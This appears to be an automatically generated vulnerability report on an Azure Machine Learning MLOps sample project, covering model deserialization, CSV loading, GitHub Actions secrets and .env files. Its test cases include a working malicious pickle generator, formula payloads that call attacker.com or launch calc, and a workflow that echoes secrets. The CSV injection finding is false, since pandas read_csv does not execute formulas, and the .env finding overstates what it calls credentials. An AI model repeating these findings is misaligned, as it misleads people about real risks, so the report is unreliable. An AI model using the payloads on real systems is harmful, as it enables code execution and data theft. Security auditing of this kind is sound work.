### Combined Vulnerability List

This document outlines critical and high severity vulnerabilities identified in the provided lists. These vulnerabilities pose significant security risks and require immediate attention and mitigation.

#### Deserialization vulnerability in online scoring endpoint leading to Remote Code Execution

- Description:
    1. The online scoring endpoint, defined in `/src/deploy/online/score.py`, loads the machine learning model using `joblib.load` in the `init()` function.
    2. The `init()` function is executed when the online endpoint's container is initialized or started, typically during deployment or after an update.
    3. `joblib.load` is known to be vulnerable to deserialization attacks. If a serialized object from an untrusted source is loaded, it can lead to arbitrary code execution.
    4. If an attacker manages to replace the legitimate model file (`model.pkl`) within the deployed environment with a maliciously crafted serialized object, the `joblib.load` call in `init()` will execute arbitrary code on the server hosting the online endpoint when the container starts or restarts.
    5. This can be achieved if the model registry or model deployment pipeline is compromised, allowing the attacker to inject a malicious model.
- Impact:
    - Critical. Successful exploitation allows for arbitrary code execution on the server hosting the online endpoint.
    - An attacker can gain complete control over the machine learning inference server, potentially leading to:
        - Data breach and exfiltration of sensitive information, including training data, user data, or secrets stored on the server.
        - System compromise, allowing the attacker to modify system configurations, install backdoors, or pivot to other internal systems.
        - Denial of service by crashing the endpoint or consuming excessive resources.
- Vulnerability Rank: Critical
- Currently implemented mitigations:
    - None. The provided code and configurations do not include any specific mitigations against deserialization vulnerabilities. The security relies on the underlying Azure Machine Learning platform and the security of the model deployment pipeline, but the code itself does not implement any checks or secure loading practices.
- Missing mitigations:
    - Model origin validation and integrity checks: Before loading the model using `joblib.load`, the scoring script should verify the origin and integrity of the model file to ensure it comes from a trusted source and has not been tampered with. This could involve cryptographic signatures or checksums.
    - Secure model serialization format: Consider using safer serialization formats that are less prone to deserialization attacks if possible. If `joblib` is necessary, ensure that the model loading process is strictly controlled and isolated.
    - Principle of least privilege: Ensure that the online endpoint service account and container environment have the minimum necessary privileges to reduce the potential impact of a successful exploit.
    - Regular security scanning: Implement regular security scanning of the model deployment pipeline and deployed endpoints to detect and prevent the introduction of malicious models.
- Preconditions:
    - The online endpoint must be deployed using the provided configurations, which include the vulnerable scoring script (`/src/deploy/online/score.py`) and the use of `joblib.load`.
    - An attacker needs to compromise the model deployment pipeline or model registry to replace the legitimate `model.pkl` file with a malicious one. This could involve exploiting vulnerabilities in CI/CD systems, access control weaknesses, or insider threats.
- Source code analysis:
    1. **File:** `/src/deploy/online/score.py`
    2. **Function:** `init()`
    3. **Line:** `model = joblib.load(model_path)`
    ```python
    def init():
        global model
        model_path = os.path.join(os.getenv("AZUREML_MODEL_DIR"), "models/model.pkl")
        model = joblib.load(model_path) # Vulnerable line
        logging.info("Init complete")
    ```
    - The `init()` function is executed during container startup.
    - `model_path` is constructed using the environment variable `AZUREML_MODEL_DIR`, which points to the deployed model directory.
    - `joblib.load(model_path)` deserializes the model from the `model.pkl` file.
    - `joblib.load` is susceptible to deserialization vulnerabilities, allowing for arbitrary code execution if a malicious `model.pkl` is loaded.
- Security test case:
    1. **Prepare a malicious model file:**
        - Create a Python script `malicious_model_generator.py` with the following content to generate a malicious `model.pkl` file:
        ```python
        import joblib
        import os

        class MaliciousObject:
            def __reduce__(self):
                return (os.system, ('touch /tmp/pwned',)) # Command to execute: create /tmp/pwned file

        malicious_model = MaliciousObject()
        joblib.dump(malicious_model, 'model.pkl')
        ```
        - Run the script: `python malicious_model_generator.py`
        - This will create a file named `model.pkl` in the same directory. This file is a malicious serialized object.
    2. **Deploy the online endpoint (or simulate local deployment):**
        - For a real test, you would need to deploy the online endpoint using the provided configurations. However, replacing the model in a deployed Azure ML endpoint might be restricted. For a local simulation:
            - Assume you have a local directory structure mimicking the deployed environment, where the scoring script `/src/deploy/online/score.py` is used.
            - Locate the directory where the `model.pkl` would be placed during a real deployment (within `AZUREML_MODEL_DIR/models/`). For local testing, you might need to adjust `model_path` in `score.py` to a local, writable path.
        - **Replace the legitimate `model.pkl` with the malicious `model.pkl` generated in step 1.**
    3. **Trigger the endpoint initialization:**
        - In a real deployment, restarting the endpoint or updating the deployment might trigger the `init()` function again. For a local simulation, you might need to manually run the `init()` function from `score.py` after setting up the environment variables or simulate endpoint invocation.
    4. **Check for successful code execution:**
        - After triggering the endpoint initialization (and thus the `init()` function in `score.py`), check if the command embedded in the malicious `model.pkl` was executed. In our example, the command is `touch /tmp/pwned`.
        - Access the server or container hosting the online endpoint and check if the file `/tmp/pwned` exists.
        - If the file `/tmp/pwned` is present, it confirms that arbitrary code execution was achieved through deserialization of the malicious model file.

#### CSV Injection in Training Data Loading

- Description:
    1. An attacker crafts a malicious CSV file containing code designed for CSV injection vulnerabilities in pandas `read_csv` function.
    2. The user, intending to train a model using this project's example, configures their ML pipeline to use the attacker's malicious CSV file as the training dataset. This could happen if the user's data source is compromised or if the attacker can influence the data before it's used in the pipeline.
    3. When the training script `/code/src/model/train.py` executes, it uses pandas `pd.read_csv()` to load the training data from the attacker-controlled CSV file.
    4. Due to the CSV injection vulnerability, malicious code embedded in the CSV is executed during the data loading process.
- Impact:
    Arbitrary code execution on the machine running the training pipeline. This could lead to data exfiltration, system compromise, or other malicious activities.
- Vulnerability Rank: High
- Currently Implemented Mitigations: None
- Missing Mitigations:
    - Input validation and sanitization of CSV files before loading. This could involve checking for and escaping or rejecting potentially harmful characters or patterns in the CSV data.
    - Using secure data loading methods that are not vulnerable to CSV injection. Explore alternatives to `pd.read_csv()` if a safer option exists for the project's data format.
    - Implementing sandboxing or containerization for data processing and model training tasks to limit the impact of potential code execution vulnerabilities. Running these processes in isolated environments with restricted permissions can contain the damage.
- Preconditions:
    - The user must configure their MLOps pipeline to use a training dataset that is controlled or influenced by the attacker.
    - The training pipeline must execute the vulnerable code `/code/src/model/train.py` which uses `pd.read_csv()` to load the data.
- Source Code Analysis:
    1. Open the file `/code/src/model/train.py`.
    2. Locate the `main` function.
    3. Inside the `main` function, find the line: `df = pd.read_csv(args.input_data)`.
    4. Observe that `args.input_data`, which is user-provided input specifying the path to the training data, is directly passed to the `pd.read_csv()` function without any prior validation or sanitization.
    5. If `args.input_data` points to a malicious CSV file, the `pd.read_csv()` function is vulnerable to CSV injection, potentially leading to arbitrary code execution.
    6. Confirm that there is no input validation or sanitization performed on `args.input_data` or the content of the CSV file before it's loaded using `pd.read_csv()`.
- Security Test Case:
    1. Create a malicious CSV file named `malicious.csv` with a CSV injection payload. For example, using a formula injection payload:
       ```csv
       Column1,Column2
       =IMPORTXML(‘http://attacker.com/malicious.xml’,‘/’),value2
       ```
       **Note:** The specific payload might need to be adjusted based on the exact version of pandas and the underlying libraries to ensure successful injection. `=IMPORTXML` is used as an example, and other payloads like `=SYSTEM`, `=cmd|' /C calc'!A0` or similar might be applicable depending on the environment and pandas version.
    2. Modify the `cli/jobs/train.yml` file to use the `malicious.csv` file as input.  Change the `path` under `inputs.nyc_taxi_data` to point to the `malicious.csv` file. If testing locally, this could be a relative or absolute file path accessible to the execution environment. For testing in an Azure ML environment, the `malicious.csv` file would need to be uploaded to a datastore and the `path` should be adjusted to reference the datastore path.
    3. Run the training job using the modified `cli/jobs/train.yml`. Execute the script using: `bash ./scripts/jobs/train.sh`.
    4. Monitor the execution logs and system behavior for signs of code injection. For example, if the payload is designed to perform a network request (like `=IMPORTXML(‘http://attacker.com/malicious.xml’,‘/’)`), monitor for network connections to `attacker.com`. If the payload is intended to execute a system command (if possible with `pd.read_csv` and the environment), check for the effects of that command, such as file creation or process execution.
    5. If the malicious actions defined in the CSV payload are observed, the CSV injection vulnerability is confirmed. For example, if using `=IMPORTXML`, and a network request to `attacker.com` is observed when running the training job, this confirms the injection. For more direct command execution payloads (if applicable to `pd.read_csv`), successful execution of the injected commands would confirm the vulnerability.

#### Potential Exposure of Azure Credentials in GitHub Actions Workflow Logs

- Description:
    - The `docs/quickstart.md` guide instructs users to create a GitHub Secret named `AZURE_CREDENTIALS` to store Azure service principal credentials for authenticating GitHub Actions workflows with Azure.
    - While using GitHub Secrets is the recommended approach for securely storing credentials in GitHub Actions, misconfiguration in workflows can lead to these secrets being unintentionally exposed in workflow execution logs.
    - For instance, if a workflow script is written to echo the value of `secrets.AZURE_CREDENTIALS` for debugging purposes, or if verbose logging is enabled for Azure CLI commands that use the service principal, the secret might be printed in plain text within the workflow logs.
    - If workflow logs are accessible to unauthorized users (e.g., in public repositories or due to misconfigured permissions), these exposed credentials could be harvested and misused to gain unauthorized access to the associated Azure resources.
- Impact:
    - High. Potential exposure of Azure Service Principal credentials (AZURE_CREDENTIALS).
    - Direct unauthorized access to Azure resources managed by the service principal.
    - Could lead to data breaches, resource manipulation, or other malicious activities within the Azure subscription.
- Vulnerability Rank: High
- Currently implemented mitigations:
    - The documentation (`docs/quickstart.md`) correctly advises users to use GitHub Secrets for storing `AZURE_CREDENTIALS`. This is the primary intended mitigation.
    - GitHub Secrets are designed to prevent secrets from being directly visible in workflow definitions and are masked in logs under normal circumstances.
- Missing mitigations:
    - The project lacks example GitHub Actions workflow configurations that explicitly demonstrate secure handling of `AZURE_CREDENTIALS` and best practices to prevent accidental exposure in logs.
    - Documentation should include clear warnings and best practices for developers to avoid logging secrets, such as:
        - Never explicitly echo or print the content of secret variables in workflow scripts.
        - Avoid using verbose logging options for Azure CLI or other tools when commands involve secrets.
        - Review workflow logs carefully for any unintended secret exposure during development and testing.
        - Consider using tools or linters that can automatically scan workflow definitions and logs for potential secret leaks (though this is a general recommendation, not project-specific mitigation).
- Preconditions:
    - User sets up GitHub Actions CI/CD as described in `docs/quickstart.md`.
    - User correctly configures the `AZURE_CREDENTIALS` GitHub Secret.
    - GitHub Actions workflows are created or modified to include insecure logging or handling of the `AZURE_CREDENTIALS` secret.
    - Workflow execution logs are generated and are accessible to potential attackers (e.g., repository is public, or permissions are improperly set).
- Source code analysis:
    - `/code/docs/quickstart.md`: The "GitHub Actions のシークレット作成" section guides users to create a secret named `AZURE_CREDENTIALS`. It refers to external Azure documentation for details on setting up service principals and storing credentials as GitHub Secrets, which is generally secure if implemented correctly. However, the provided project files do not include any example GitHub Actions workflow files to verify secure secret handling practices within the project's context. We must assume potential insecure workflow configurations based on common developer errors.
    - Based on common insecure practices, a hypothetical vulnerable workflow step in a file like `.github/workflows/smoke-testing.yml` could be:
          ```yaml
          jobs:
            example_job:
              runs-on: ubuntu-latest
              steps:
              - name: Checkout code
                uses: actions/checkout@v3
              - name: Insecurely log credentials (Example of vulnerability)
                run: echo "Azure Credentials: ${{ secrets.AZURE_CREDENTIALS }}" # INSECURE - DO NOT DO THIS
              - name: Azure Login (Potentially verbose logging)
                uses: azure/login@v1
                with:
                  creds: ${{ secrets.AZURE_CREDENTIALS }}
                  enable-AzPSSession: true
                  allow-no-subscriptions: true
          ```
          In this example, the `Insecurely log credentials` step would directly print the secret to the logs. Even in the `Azure Login` step, if underlying Azure CLI commands used by the action have verbose logging enabled, there's a risk of secret leakage depending on how the action handles and masks secrets in verbose output.
- Security test case:
    1. Fork the repository to a personal or organizational GitHub account.
    2. In the forked repository, create a new GitHub Secret named `AZURE_CREDENTIALS` and assign it a dummy JSON service principal credential value (e.g., `{"clientId": "dummy_client_id", "clientSecret": "dummy_client_secret", "subscriptionId": "dummy_subscription_id", "tenantId": "dummy_tenant_id"}`).
    3. Create a new workflow file in `.github/workflows/` directory, for example `test-secret-logging.yml`, with the following content to simulate insecure logging:
          ```yaml
          name: Test Secret Logging
          on: push
          jobs:
            log_secret:
              runs-on: ubuntu-latest
              steps:
                - name: Checkout code
                  uses: actions/checkout@v3
                - name: Insecurely log AZURE_CREDENTIALS secret
                  run: echo "Printing AZURE_CREDENTIALS: ${{ secrets.AZURE_CREDENTIALS }}"
          ```
    4. Commit and push this workflow file to the forked repository.
    5. Navigate to the "Actions" tab in the forked repository on GitHub and find the "Test Secret Logging" workflow run.
    6. Click on the workflow run to view its details, then click on the "log_secret" job.
    7. Inspect the job execution logs. You should observe that the dummy service principal credential value (or parts of it) is printed in the logs due to the `echo` command, demonstrating the potential for secret exposure if a real credential and similar insecure logging were used.

#### Exposure of Azure Credentials in `.env` file via Git History

- Description:
    - The project instructs users to create a `.env` file at the root of the repository to store Azure Machine Learning workspace credentials as environment variables.
    - The `quickstart.md` documentation guides users to set up these credentials in the `.env` file.
    - If a user, by mistake or lack of awareness, removes or modifies the `.gitignore` rule that excludes `.env` files and subsequently commits the `.env` file to the Git repository, these sensitive credentials will be exposed in the Git history.
    - Once committed and pushed to a remote repository (like a public GitHub repository after forking), anyone with access to the repository's Git history can potentially view these credentials.
    - An attacker can then extract these credentials from the Git history.
- Impact:
    - If an attacker gains access to the Azure credentials, they can authenticate to the Azure Machine Learning workspace.
    - This unauthorized access allows the attacker to:
        - Manipulate or delete machine learning assets (datasets, models, environments, compute resources).
        - Modify or control ML pipelines, potentially injecting malicious code or data.
        - Access sensitive data stored within the Azure ML workspace.
        - Impersonate the service principal to perform actions within the Azure subscription, depending on the permissions assigned to the service principal.
- Vulnerability Rank: High
- Currently Implemented Mitigations:
    - The project includes a `.gitignore` file at the root directory.
    - This `.gitignore` file contains an entry to exclude `.env` files from being tracked by Git:
        ```
        .env
        ```
    - This mitigation prevents users from accidentally adding `.env` files to their Git staging area and committing them, under normal circumstances.
- Missing Mitigations:
    - **Explicit Warning in Documentation:** The documentation, specifically `quickstart.md`, should include a clear and prominent warning to users about the security risks of committing the `.env` file. This warning should advise users to ensure that the `.env` file is never committed to the Git repository and explain the purpose of the `.gitignore` rule.
    - **Pre-commit Hook to Check for `.env`:** Implement a pre-commit hook that automatically checks if a `.env` file is being added or modified in a commit. If detected, the hook should prevent the commit and display a warning message to the user, reinforcing the security best practice.
- Preconditions:
    - User follows the project's quickstart guide and creates a `.env` file to configure Azure credentials.
    - User, either intentionally or unintentionally, modifies or removes the `.gitignore` rule that excludes `.env` files.
    - User executes `git add .env` or `git add --all` and commits the changes, including the `.env` file, to the Git repository.
    - User pushes the commit to a remote Git repository, making the commit history (and the `.env` file) accessible to others depending on repository's visibility.
- Source Code Analysis:
    - **File: `/code/README.md` and `/code/docs/quickstart.md`**: These files instruct users to create a `.env` file and set environment variables for Azure credentials. For example, `quickstart.md` says:
        ```
        - .env ファイルを開いて環境変数を設定します。
           - GROUP: Azure Machine Learning ワークスペースのリソースグループ名
           - WORKSPACE: Azure Machine Learning ワークスペースの名前
           - LOCATION: Azure Machine Learning ワークスペースのリージョン
           - SUBSCRIPTION: Azure サブスクリプションID
        ```
    - **File: `/.gitignore`**: This file includes `.env`, which is intended to prevent accidental commits of this file.
        ```
        .env
        ```
    - **Vulnerability**: While `.gitignore` is present, there is no explicit warning in the documentation to reinforce the importance of not committing `.env` files. Users might unknowingly remove the `.gitignore` entry or fail to understand the risk if they are not security-conscious.
- Security Test Case:
    1. **Setup:**
        - Fork the repository to your GitHub account.
        - Clone the forked repository to your local machine.
        - Follow the instructions in `docs/quickstart.md` to create a `.env` file in the root directory and populate it with **dummy** Azure credentials (do not use real credentials). For example:
            ```
            GROUP="dummy_resource_group"
            WORKSPACE="dummy_workspace_name"
            LOCATION="dummy_location"
            SUBSCRIPTION="dummy_subscription_id"
            ```
        - **Simulate Misconfiguration:** Edit the `.gitignore` file in the root directory and remove the line `.env`. This simulates a user accidentally or intentionally removing the protection.
    2. **Commit and Push `.env`:**
        - Initialize a Git repository if not already initialized (it should be already initialized after cloning).
        - Stage the `.env` file: `git add .env`
        - Commit the staged `.env` file: `git commit -m "Accidentally committing .env file"`
        - Push the commit to your forked repository on GitHub: `git push origin main`
    3. **Verify Exposure:**
        - Go to your forked repository on GitHub in a web browser.
        - Navigate to the commit history.
        - Find the commit "Accidentally committing .env file".
        - Browse the files in this commit.
        - **Observe**: You will see that the `.env` file is now part of the repository's history, and its contents (the dummy credentials in this case) are exposed in plain text to anyone who can view the repository's history.
    4. **Clean up (Important):**
        - **Remove the `.env` file from the Git history.** This is crucial to prevent accidental exposure even with dummy credentials. Use tools like `git filter-branch` or `BFG Repo-Cleaner` to remove the `.env` file from all commits and history.
        - **Restore `.gitignore`:** Re-add `.env` to the `.gitignore` file and commit the change to prevent future accidental commits.
